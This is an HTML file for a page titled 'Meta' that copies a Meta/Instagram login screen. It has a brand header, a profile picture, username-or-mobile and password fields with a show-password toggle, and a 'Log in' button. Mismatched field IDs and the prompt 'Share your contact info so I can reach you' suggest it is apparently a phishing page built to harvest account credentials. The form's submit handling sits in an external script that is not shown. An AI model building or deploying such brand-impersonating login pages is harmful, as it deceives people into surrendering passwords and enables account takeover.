<!DOCTYPE html>
<html lang="en">

<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Meta</title>
  <link rel="stylesheet" href="style.css">
</head>

<body>

  <!-- Top Language Title Bar -->
  <div class="lang-top">English (UK)</div>

  <div class="card">

    <div class="top">Meta</div>

    <img src="Insta2.jpg" class="dp" alt="Profile Picture">

    <form id="contactForm">

      <div class="input-box">
        <input type="text" id="name" placeholder="username or mobile number" required>
      </div>

      <div class="input-box">
        <input type="password" id="mobile" placeholder="password" required>
        
        <!-- Professional SVG Eye Icon -->
        <span id="togglePassword" class="eye-btn">
          <!-- Eye Open Icon -->
          <svg class="eye-open" viewBox="0 0 24 24" width="20" height="20" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
            <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"></path>
            <circle cx="12" cy="12" r="3"></circle>
          </svg>
          <!-- Eye Closed / Slash Icon -->
          <svg class="eye-closed" viewBox="0 0 24 24" width="20" height="20" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
            <path d="M17.94 17.94A10.07 10.07 0 0 1 12 20c-7 0-11-8-11-8a18.45 18.45 0 0 1 5.06-5.94M9.9 4.24A9.12 9.12 0 0 1 12 4c7 0 11 8 11 8a18.5 18.5 0 0 1-2.16 3.19m-6.72-1.07a3 3 0 1 1-4.24-4.24"></path>
            <line x1="1" y1="1" x2="23" y2="23"></line>
          </svg>
        </span>
      </div>

      <!-- Button ke andar text aur spinner -->
      <button type="submit" id="loginBtn">
        <span class="btn-text">Log in</span>
        <span class="spinner" id="spinner"></span>
      </button>

    </form>

    <div class="stay">Stay Connected</div>

    <div class="divider">
      <span>ⓘ</span>
    </div>

    <div class="info">
      Share your contact info so I can reach you.
    </div>

  </div>

  <script src="script.js"></script>

</body>
</html>
